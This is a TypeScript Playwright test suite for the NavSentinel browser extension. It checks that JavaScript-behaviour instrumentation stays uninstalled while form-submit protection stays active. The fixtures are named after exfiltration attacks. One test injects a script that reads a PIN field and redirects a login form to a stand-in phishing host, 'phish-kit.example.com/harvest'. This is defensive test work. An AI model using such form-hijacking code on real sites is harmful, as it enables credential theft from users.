/**
 * JS Behavior Analysis E2E Tests (P4-02, re-scoped by RI-07)
 *
 * RI-07 made broad JavaScript-behaviour instrumentation an explicit release
 * capability (`capabilities.jsBehaviorInstrumentation` in
 * config/release-profiles.json) that every committed profile leaves OFF. The
 * build therefore aliases the monitor to a no-op module and the wrapping is
 * never installed at all.
 *
 * These tests are the browser-level proof of that, against the same fixtures
 * that used to prove the signal pipeline:
 * 1. The bridge is still active (data-navsentinel-bridge-ready)
 * 2. window.fetch / XMLHttpRequest.open+send / navigator.sendBeacon / the
 *    HTMLInputElement password-value getter are still NATIVE
 * 3. Core navigation protection is unaffected — main_guard still wraps
 *    HTMLFormElement.prototype.submit
 * 4. No JS-behaviour NRS factor is produced on the multi-signal fixture
 * 5. Page APIs work and the legit form raises no toast
 *
 * When the capability is turned on (which RI-07 gates on compatibility and
 * performance evidence that does not exist yet) these expectations have to be
 * re-inverted along with it.
 */
import { test, expect, chromium, type BrowserContext, type Page } from "@playwright/test";
import fs from "fs";
import os from "os";
import path from "path";
import { fileURLToPath } from "url";
import { SUITE_SETTINGS_KEY } from "../../extension/src/shared/storage";
import {
  assertNoToastFor,
  getGymBaseUrl,
  getServiceWorker,
  waitForNavSentinelBridge,
} from "./extension_test_utils";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const extensionPath = process.env.EXTENSION_PATH
  ? path.resolve(process.env.EXTENSION_PATH)
  : path.resolve(__dirname, "..", "..", "extension", "dist");
const gymRoot = path.resolve(__dirname, "..", "..", "gym");

test.setTimeout(120_000);

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

async function enableDebugSettings(context: BrowserContext): Promise<void> {
  const sw = await getServiceWorker(context);
  await sw.evaluate(async (settingsKey: string) => {
    await chrome.storage.local.set({
      [settingsKey]: {
        nav: { defaultMode: "smart", debug: true }
      }
    });
  }, SUITE_SETTINGS_KEY);
}

async function setupFixtureTest(fixtureName: string, options: { debug?: boolean } = {}) {
  const { baseUrl, gym } = await getGymBaseUrl(gymRoot);
  const userDataDir = fs.mkdtempSync(path.join(os.tmpdir(), "navsentinel-jsbeh-"));

  let context;
  try {
    context = await chromium.launchPersistentContext(userDataDir, {
      headless: false,
      timeout: 60_000,
      args: [
        `--disable-extensions-except=${extensionPath}`,
        `--load-extension=${extensionPath}`,
      ],
    });
  } catch (err) {
    if (gym) await gym.close();
    fs.rmSync(userDataDir, { recursive: true, force: true });
    throw err;
  }

  let page;
  try {
    if (options.debug) {
      await enableDebugSettings(context);
    }
    page = await context.newPage();
    await page.goto(`${baseUrl}/${fixtureName}`, {
      waitUntil: "domcontentloaded",
      timeout: 20_000,
    });
    await waitForNavSentinelBridge(page);
  } catch (err) {
    await context.close();
    if (gym) await gym.close();
    fs.rmSync(userDataDir, { recursive: true, force: true });
    throw err;
  }

  return {
    page,
    context,
    baseUrl,
    cleanup: async () => {
      await context.close();
      if (gym) await gym.close();
      fs.rmSync(userDataDir, { recursive: true, force: true });
    },
  };
}

/**
 * Read which main-world globals carry a wrapper, from inside the page.
 *
 * `Function.prototype.toString` on a native function yields "[native code]"; a
 * JS wrapper yields its own source. That distinction is what proves the RI-07
 * capability-off build installs nothing rather than installing an inert wrapper.
 */
async function readInstrumentationState(page: Page) {
  return page.evaluate(() => {
    const isNative = (fn: unknown): boolean =>
      typeof fn === "function" && Function.prototype.toString.call(fn).includes("[native code]");

    const valueDesc = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, "value");

    return {
      fetchNative: isNative(window.fetch),
      xhrOpenNative: isNative(XMLHttpRequest.prototype.open),
      xhrSendNative: isNative(XMLHttpRequest.prototype.send),
      beaconNative: isNative(navigator.sendBeacon),
      passwordValueGetterNative: isNative(valueDesc?.get),
      // main_guard's navigation firewall wraps form submit independently of the
      // JS-behaviour capability; it must STAY wrapped.
      formSubmitPatched: !isNative(HTMLFormElement.prototype.submit),
    };
  });
}

/**
 * Verify page APIs still work after signal execution (try-catch safety).
 */
async function verifyPageApisIntact(page: Page) {
  return page.evaluate(() => {
    const form = document.querySelector("form");
    if (!form) return { formSubmitWorks: true, valueGetterWorks: true };

    let formSubmitWorks = true;
    try {
      const prevented = new Event("submit", { cancelable: true });
      form.dispatchEvent(prevented);
    } catch {
      formSubmitWorks = false;
    }

    let valueGetterWorks = true;
    try {
      const input = document.querySelector('input[type="password"]') as HTMLInputElement | null;
      if (input) {
        const _val = input.value;
        void _val;
      }
    } catch {
      valueGetterWorks = false;
    }

    return { formSubmitWorks, valueGetterWorks };
  });
}

async function dispatchFormSubmit(
  page: Page,
  formSelector = "#login-form",
  submitterSelector = "#submit-btn"
): Promise<void> {
  await page.evaluate(
    ({ formSelector: formSel, submitterSelector: submitterSel }) => {
      const form = document.querySelector(formSel);
      if (!(form instanceof HTMLFormElement)) throw new Error(`Form not found: ${formSel}`);

      const submitter = document.querySelector(submitterSel);
      const event = new SubmitEvent("submit", {
        bubbles: true,
        cancelable: true,
        submitter: submitter instanceof HTMLElement ? submitter : null,
      });
      form.dispatchEvent(event);
    },
    { formSelector, submitterSelector }
  );
}

async function clickDebugProbeAndRead(page: Page): Promise<string> {
  await page.evaluate(() => {
    const existing = document.getElementById("navsentinel-js-behavior-probe");
    if (existing) existing.remove();

    const probe = document.createElement("a");
    probe.id = "navsentinel-js-behavior-probe";
    probe.href = "#navsentinel-js-behavior-probe-target";
    probe.textContent = "NavSentinel probe";
    document.body.appendChild(probe);
    probe.click();
  });

  const handle = await page.waitForFunction(() => {
    const host = document.querySelector("#__navsentinel_debug_host");
    const text = host?.shadowRoot?.querySelector("pre")?.textContent?.trim();
    return text || null;
  }, null, { timeout: 5000 });

  return (await handle.jsonValue()) as string;
}

async function runInPageMainWorld(page: Page, source: string): Promise<void> {
  await page.evaluate((scriptSource) => {
    const script = document.createElement("script");
    script.textContent = scriptSource;
    document.documentElement.appendChild(script);
    script.remove();
  }, source);
}

// ==========================================================================
// RI-07 - Capability-off verification
// ==========================================================================

test.describe("JS Behavior Analysis", () => {
  test("no JS-behaviour instrumentation is installed, navigation guard still is @p4 @regression", async () => {
    test.skip(!fs.existsSync(extensionPath), "Build the extension first.");

    const { page, cleanup } = await setupFixtureTest("js-behavior-01-credential-exfil.html");

    try {
      const state = await readInstrumentationState(page);
      // RI-07: the capability is off in every committed profile, so these must be
      // untouched natives — not wrappers that merely decline to act.
      expect(state.fetchNative).toBe(true);
      expect(state.xhrOpenNative).toBe(true);
      expect(state.xhrSendNative).toBe(true);
      expect(state.beaconNative).toBe(true);
      expect(state.passwordValueGetterNative).toBe(true);
      // Core navigation protection is unaffected by the capability.
      expect(state.formSubmitPatched).toBe(true);
    } finally {
      await cleanup();
    }
  });

  // ==========================================================================
  // Non-interference on the former true-positive fixtures
  // ==========================================================================

  test("js-behavior-01 cross-origin credential form: page intact @p4 @regression", async () => {
    test.skip(!fs.existsSync(extensionPath), "Build the extension first.");

    const { page, cleanup } = await setupFixtureTest("js-behavior-01-credential-exfil.html");

    try {
      await expect(page.locator("#submit-btn")).toBeVisible();
      await dispatchFormSubmit(page);
      await page.waitForTimeout(500);

      const apis = await verifyPageApisIntact(page);
      expect(apis.formSubmitWorks).toBe(true);
      expect(apis.valueGetterWorks).toBe(true);
    } finally {
      await cleanup();
    }
  });

  test("js-behavior-02 dynamic action change: page intact @p4 @regression", async () => {
    test.skip(!fs.existsSync(extensionPath), "Build the extension first.");

    const { page, cleanup } = await setupFixtureTest("js-behavior-02-dynamic-action.html");

    try {
      await page.waitForFunction(
        () => document.getElementById("status")?.className === "triggered",
        null,
        { timeout: 5000 }
      );

      const submitBtn = page.locator("#submit-btn");
      await submitBtn.click();
      await page.waitForTimeout(500);

      const apis = await verifyPageApisIntact(page);
      expect(apis.formSubmitWorks).toBe(true);
    } finally {
      await cleanup();
    }
  });

  test("js-behavior-03 fetch exfil: page fetch is untouched @p4 @regression", async () => {
    test.skip(!fs.existsSync(extensionPath), "Build the extension first.");

    const { page, cleanup } = await setupFixtureTest("js-behavior-03-fetch-exfil.html");

    try {
      await expect(page.locator("#submit-btn")).toBeVisible();
      await dispatchFormSubmit(page);
      await page.waitForTimeout(1000);

      // The monitor is not installed, so page fetch must be the native one and work.
      const fetchWorks = await page.evaluate(async () => {
        try {
          await fetch("data:text/plain,test");
          return true;
        } catch {
          return false;
        }
      });
      expect(fetchWorks).toBe(true);
    } finally {
      await cleanup();
    }
  });

  test("js-behavior-04 beacon exfil: sendBeacon is untouched @p4 @regression", async () => {
    test.skip(!fs.existsSync(extensionPath), "Build the extension first.");

    const { page, cleanup } = await setupFixtureTest("js-behavior-04-beacon-exfil.html");

    try {
      await page.waitForFunction(
        () => document.getElementById("status")?.textContent?.includes("sendBeacon fired"),
        null,
        { timeout: 6000 }
      );

      // sendBeacon is not wrapped, so it must work exactly as the native API.
      const beaconWorks = await page.evaluate(() => {
        try {
          return navigator.sendBeacon("/beacon-probe", "ok");
        } catch {
          return false;
        }
      });
      expect(beaconWorks).toBe(true);
    } finally {
      await cleanup();
    }
  });

  test("js-behavior-05 credential value read: getter is untouched, page intact @p4 @regression", async () => {
    test.skip(!fs.existsSync(extensionPath), "Build the extension first.");

    const { page, cleanup } = await setupFixtureTest("js-behavior-05-credential-read.html");

    try {
      await page.waitForFunction(
        () => document.getElementById("status")?.className === "triggered",
        null,
        { timeout: 10000 }
      );

      // Verify the value getter still returns the correct value
      const valueCorrect = await page.evaluate(() => {
        const input = document.getElementById("pass-field") as HTMLInputElement;
        return input.value === "my-secret-password";
      });
      expect(valueCorrect).toBe(true);

      const apis = await verifyPageApisIntact(page);
      expect(apis.valueGetterWorks).toBe(true);
    } finally {
      await cleanup();
    }
  });

  // ==========================================================================
  // False Positive Tests
  // ==========================================================================

  test("js-behavior-06 legitimate form: no toast, no page breakage @p4 @regression", async () => {
    test.skip(!fs.existsSync(extensionPath), "Build the extension first.");

    const { page, cleanup } = await setupFixtureTest("js-behavior-06-legit-form.html");

    try {
      const submitBtn = page.locator("#submit-btn");
      await expect(submitBtn).toBeVisible();
      await submitBtn.click();

      await assertNoToastFor(page, 2000);

      const apis = await verifyPageApisIntact(page);
      expect(apis.formSubmitWorks).toBe(true);
      expect(apis.valueGetterWorks).toBe(true);
    } finally {
      await cleanup();
    }
  });

  // ==========================================================================
  // Multi-signal / Pipeline Integration
  // ==========================================================================

  test("js-behavior-07 multi-signal attack: no JS-behaviour NRS factor is produced @p4 @regression", async () => {
    test.skip(!fs.existsSync(extensionPath), "Build the extension first.");

    const { page, cleanup } = await setupFixtureTest("js-behavior-07-multi-signal.html", {
      debug: true,
    });

    try {
      await runInPageMainWorld(page, `
        (() => {
          const pin = document.getElementById("pin-field");
          void pin?.value;
          const form = document.getElementById("login-form");
          const submitter = document.getElementById("submit-btn");
          if (!(form instanceof HTMLFormElement)) throw new Error("login form not found");
          form.setAttribute("action", "https://phish-kit.example.com/harvest");
          form.dispatchEvent(new SubmitEvent("submit", {
            bubbles: true,
            cancelable: true,
            submitter: submitter instanceof HTMLElement ? submitter : null,
          }));
        })();
      `);
      await page.waitForTimeout(1000);

      // After all signals fire, verify page APIs are intact
      const apis = await verifyPageApisIntact(page);
      expect(apis.formSubmitWorks).toBe(true);
      expect(apis.valueGetterWorks).toBe(true);

      // Verify fetch still works
      const fetchWorks = await page.evaluate(async () => {
        try {
          await fetch("data:text/plain,test");
          return true;
        } catch {
          return false;
        }
      });
      expect(fetchWorks).toBe(true);

      // RI-07: with the capability off no ns-js-* signal ever reaches the
      // isolated world, so the NRS breakdown must carry no JS-behaviour factor.
      const debugText = await clickDebugProbeAndRead(page);
      expect(debugText).not.toContain("nrs_js_behavior");
    } finally {
      await cleanup();
    }
  });
});
